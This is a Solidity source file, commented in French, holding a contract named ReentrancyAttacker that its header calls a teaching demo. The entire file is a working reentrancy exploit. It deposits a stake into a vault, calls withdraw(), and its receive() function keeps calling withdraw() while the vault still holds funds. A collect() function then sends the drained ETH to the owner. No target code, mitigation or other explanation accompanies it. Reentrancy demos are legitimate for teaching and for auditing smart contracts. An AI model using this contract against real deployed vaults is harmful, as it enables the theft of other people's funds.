// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IVault} from "./IVault.sol";

/// @title ReentrancyAttacker - contrat d'attaque par réentrance (démo pédagogique)
/// @notice Dépose 1 ETH puis appelle withdraw(). Quand le coffre lui envoie l'ETH, sa fonction
///         receive() s'exécute et rappelle withdraw() tant que le coffre contient encore des fonds.
contract ReentrancyAttacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public immutable stake;
    uint256 public reentries;

    constructor(IVault vault_) payable {
        vault = vault_;
        owner = msg.sender;
        stake = msg.value;
    }

    function attack() external {
        require(msg.sender == owner, "pas owner");
        vault.deposit{value: stake}();
        vault.withdraw();
    }

    receive() external payable {
        // Tant que le coffre a encore au moins notre mise, on ré-entre.
        if (address(vault).balance >= stake) {
            reentries++;
            vault.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "pas owner");
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "envoi echoue");
    }
}
